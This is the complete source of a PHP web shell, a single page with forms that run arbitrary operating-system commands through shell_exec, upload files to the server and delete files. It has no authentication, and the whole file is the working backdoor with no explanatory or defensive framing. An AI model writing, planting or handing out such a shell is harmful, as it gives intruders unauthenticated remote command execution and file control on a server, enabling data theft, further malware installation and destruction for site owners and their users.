<?php
$output = '';
$cwd = getcwd(); 

if(isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = shell_exec($command . " 2>&1"); 
    
    if ($output) {
        $output = "<pre>$output</pre>";
    } else {
        $output = "<pre>Command executed but no output returned.</pre>";
    }
}

if(isset($_FILES['file'])) {
    if(move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        $output = "<pre>File uploaded successfully!</pre>";
    } else {
        $output = "<pre>File upload failed.</pre>";
    }
}

if (isset($_POST['del'])) {
    $fileToDelete = basename($_POST['del']);  
    $filePath = $cwd . DIRECTORY_SEPARATOR . $fileToDelete; 

    if (file_exists($filePath)) {
        if (unlink($filePath)) {
            $output = "<pre>File '$fileToDelete' deleted successfully!</pre>";
        } else {
            $output = "<pre>Failed to delete '$fileToDelete'. Check file permissions.</pre>";
        }
    } else {
        $output = "<pre>File '$fileToDelete' not found in the current directory.</pre>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px; }
        form { margin-bottom: 20px; }
        input[type="text"], input[type="file"] { width: 80%; padding: 5px; margin: 5px 0; }
        input[type="submit"] { padding: 5px 10px; }
        .output { background-color: #fff; border: 1px solid #ccc; padding: 10px; margin-top: 10px; white-space: pre-wrap; }
        .cwd { font-weight: bold; }
    </style>
</head>
<body>
    <h2>PHP Web Shell</h2>

    <p class="cwd">Current Directory: <?php echo $cwd; ?></p>

    <form method="post">
        <label for="cmd">Command Execution:</label><br>
        <input type="text" name="cmd" id="cmd" placeholder="Enter command" required>
        <input type="submit" value="Execute Command">
    </form>

    <form method="post" enctype="multipart/form-data">
        <label for="file">Upload File:</label><br>
        <input type="file" name="file" id="file" required>
        <input type="submit" value="Upload File">
    </form>

    <form method="post">
        <label for="del">Delete File:</label><br>
        <input type="text" name="del" id="del" placeholder="Enter filename to delete" required>
        <input type="submit" value="Delete File">
    </form>

    <?php if ($output): ?>
        <div class="output">
            <?php echo $output; ?>
        </div>
    <?php endif; ?>
</body>
</html>
